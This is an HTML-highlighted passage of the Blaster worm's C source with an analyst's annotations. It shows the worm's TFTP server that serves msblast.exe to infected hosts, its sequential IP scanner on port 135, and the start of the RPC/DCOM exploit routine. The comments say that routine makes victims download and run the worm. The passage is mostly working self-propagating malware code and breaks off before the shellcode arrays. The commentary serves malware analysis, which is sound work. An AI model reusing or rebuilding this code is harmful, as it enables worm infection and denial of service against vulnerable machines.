</span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">opcode</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">block_id</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">data</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">reqbuf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc1">/* request packet buffer */</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">server</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/* server-side port number */</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">client</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/* client IP address and port */</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sizeof_client</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/* size of the client structure*/</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">rspbuf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc1">/* response packet */</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/* the socket for the server*/</span><span class="sc0">
</span><span class="sc16">register</span><span class="sc0"> </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fp</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">register</span><span class="sc0"> </span><span class="sc11">block_id</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">register</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">block_size</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* Set a flag indicating this thread is running. The other 
* thread will check this for 20 seconds to see if the TFTP
* service is still alive. If this thread is still alive in
* 20 seconds, it will be killed.
*/</span><span class="sc0">
</span><span class="sc11">is_tftp_running</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/*1 == TRUE*/</span><span class="sc0">

</span><span class="sc1">/* Create a server-socket to listen for UDP requests on */</span><span class="sc0">
</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_DGRAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">SOCKET_ERROR</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">closesocket_and_exit</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* Bind the socket to 69/udp */</span><span class="sc0">
</span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">server</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">server</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">server</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">server</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">TFTP_PORT_69</span><span class="sc10">);</span><span class="sc0"> 
</span><span class="sc11">server</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/*TFTP server addr = &lt;any&gt;*/</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bind</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc10">*)&amp;</span><span class="sc11">server</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">server</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">closesocket_and_exit</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* Receive a packet, any packet. The contents of the received
* packet are ignored. This means, BTW, that a defensive 
* "worm-kill" could send a packet from somewhere else. This
* will cause the TFTP server to download the msblast.exe
* file to the wrong location, preventing the victim from
* doing the download. */</span><span class="sc0">
</span><span class="sc11">sizeof_client</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">client</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">recvfrom</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">reqbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">reqbuf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc10">*)&amp;</span><span class="sc11">client</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sizeof_client</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">closesocket_and_exit</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* The TFTP server will respond with many 512 byte blocks
* until it has completely sent the file; each block must
* have a unique ID, and each block must be acknowledged.
* BUFORD: The worm ignores TFTP ACKs. This is probably why
* the worm restarts the TFTP service rather than leaving it
* enabled: it essentially flushes all the ACKs from the 
* the incoming packet queue. If the ACKs aren't flushed,
* the worm will incorrectly treat them as TFTP requests.
*/</span><span class="sc0">
</span><span class="sc11">block_id</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* Open this file. GetModuleFilename was used to figure out
* this filename. */</span><span class="sc0">
</span><span class="sc11">fp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">msblast_filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rb"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fp</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">closesocket_and_exit</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* Continue sending file fragments until none are left */</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(;;)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">block_id</span><span class="sc10">++;</span><span class="sc0">

</span><span class="sc1">/* Build TFTP header */</span><span class="sc0">
</span><span class="sc9">#define TFTP_OPCODE_DATA 3
</span><span class="sc10">*(</span><span class="sc16">short</span><span class="sc10">*)(</span><span class="sc11">rspbuf</span><span class="sc10">+</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">TFTP_OPCODE_DATA</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">*(</span><span class="sc16">short</span><span class="sc10">*)(</span><span class="sc11">rspbuf</span><span class="sc10">+</span><span class="sc4">2</span><span class="sc10">)=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">((</span><span class="sc16">short</span><span class="sc10">)</span><span class="sc11">block_id</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc1">/* Read next block of data (about 12 blocks total need
* to be read) */</span><span class="sc0">
</span><span class="sc11">block_size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fread</span><span class="sc10">(</span><span class="sc11">rspbuf</span><span class="sc10">+</span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">512</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fp</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc1">/* Increase the effective length to include the TFTP
* head built above */</span><span class="sc0">
</span><span class="sc11">block_size</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* Send this block */</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sendto</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">rspbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">block_size</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc10">*)&amp;</span><span class="sc11">client</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sizeof_client</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* Sleep for a bit.
* The reason for this is because the worm doesn't care
* about retransmits -- it therefore must send these 
* packets slow enough so congestion doesn't drop them.
* If it misses a packet, then it will DoS the victim
* without actually infecting it. Worse: the intended
* victim will continue to send packets, preventing the
* worm from infecting new systems because the 
* requests will misdirect TFTP. This design is very
* bad, and is my bet as the biggest single factor
* that slows down the worm. */</span><span class="sc0">
</span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">900</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc1">/* File transfer ends when the last block is read, which
* will likely be smaller than a full-sized block*/</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">block_size</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">rspbuf</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fp</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> 

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fp</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fp</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">closesocket_and_exit</span><span class="sc10">:</span><span class="sc0">

</span><span class="sc1">/* Notify that the thread has stopped, so that the waiting 
* thread can continue on */</span><span class="sc0">
</span><span class="sc11">is_tftp_running</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ExitThread</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">




</span><span class="sc1">/*
* This function increments the IP address. 
* BUFORD: This conversion from numbers, to strings, then back
* to number is overly complicated. Experienced programmers
* would simply store the number and increment it. This shows
* that Buford does not have much experience work with
* IP addresses.
*/</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">blaster_increment_ip_address</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(;;)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ClassD</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">254</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">ClassD</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">ClassD</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">ClassC</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ClassC</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">254</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">ClassC</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">ClassB</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ClassB</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">254</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">ClassB</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">ClassA</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ClassA</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">254</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">ClassA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/*
* This is called from the main() function in an
* infinite loop. It scans the next 20 addresses,
* then exits.
*/</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">blaster_spreader</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">fd_set</span><span class="sc0"> </span><span class="sc11">writefds</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">register</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">sin</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">peer</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sizeof_peer</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sockarray</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">opt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">victim_ip</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* Create the beginnings of a "socket-address" structure that
* will be used repeatedly below on the 'connect()' call for
* each socket. This structure specified port 135, which is
* the port used for RPC/DCOM. */</span><span class="sc0">
</span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">MSRCP_PORT_135</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc1">/* Create an array of 20 socket descriptors */</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">20</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">sockarray</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sockarray</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">ioctlsocket</span><span class="sc10">(</span><span class="sc11">sockarray</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">FIONBIO</span><span class="sc0"> </span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">opt</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Initiate a "non-blocking" connection on all 20 sockets
* that were created above.
* FAQ: Essentially, this means that the worm has 20 
* "threads" -- even though they aren't true threads.
*/</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">20</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ip</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">blaster_increment_ip_address</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">target_ip_string</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%i.%i.%i.%i"</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc11">ClassA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ClassB</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ClassC</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ClassD</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">ip</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">target_ip_string</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ip</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ip</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">sockarray</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc10">*)&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Wait 1.8-seconds for a connection.
* BUG: this is often not enough, especially when a packet
* is lost due to congestion. A small timeout actually makes
* the worm slower than faster */</span><span class="sc0">
</span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">1800</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc1">/* Now test to see which of those 20 connections succeeded.
* BUFORD: a more experienced programmer would have done
* a single 'select()' across all sockets rather than
* repeated calls for each socket. */</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">20</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">timeval</span><span class="sc0"> </span><span class="sc11">timeout</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nfds</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">timeout</span><span class="sc10">.</span><span class="sc11">tv_sec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">timeout</span><span class="sc10">.</span><span class="sc11">tv_usec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">nfds</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">FD_ZERO</span><span class="sc10">(&amp;</span><span class="sc11">writefds</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FD_SET</span><span class="sc10">((</span><span class="sc16">unsigned</span><span class="sc10">)</span><span class="sc11">sockarray</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">writefds</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">select</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">writefds</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">timeout</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">sockarray</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">sizeof_peer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">peer</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">getpeername</span><span class="sc10">(</span><span class="sc11">sockarray</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc10">*)&amp;</span><span class="sc11">peer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sizeof_peer</span><span class="sc10">);</span><span class="sc0"> 
</span><span class="sc11">victim_ip</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">inet_ntoa</span><span class="sc10">(</span><span class="sc11">peer</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc1">/* If connection succeeds, exploit the victim */</span><span class="sc0">
</span><span class="sc11">blaster_exploit_target</span><span class="sc10">(</span><span class="sc11">sockarray</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">victim_ip</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">sockarray</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/*
* This is where the victim is actually exploited. It is the same
* exploit as created by xfocus and altered by HDMoore.
* There are a couple of differences. The first is that the in
* those older exploits, this function itself would create the
* socket and connect, whereas in Blaster, the socket is already
* connected to the victim via the scanning function above. The
* second difference is that the packets/shellcode blocks are
* declared as stack variables rather than as static globals.
* Finally, whereas the older exploits give the hacker a 
* "shell prompt", this one automates usage of the shell-prompt
* to tell the victim to TFTP the worm down and run it.
*/</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">blaster_exploit_target</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">victim_ip</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

</span><span class="sc1">/* These blocks of data are just the same ones copied from the
* xfocus exploit prototype. Whereas the original exploit
* declared these as "static" variables, Blaster declares
* these as "stack" variables. This is because the xfocus
* exploit altered them -- they must be reset back to their
* original values every time. */</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">bindstr</span><span class="sc10">[]={</span><span class="sc0">
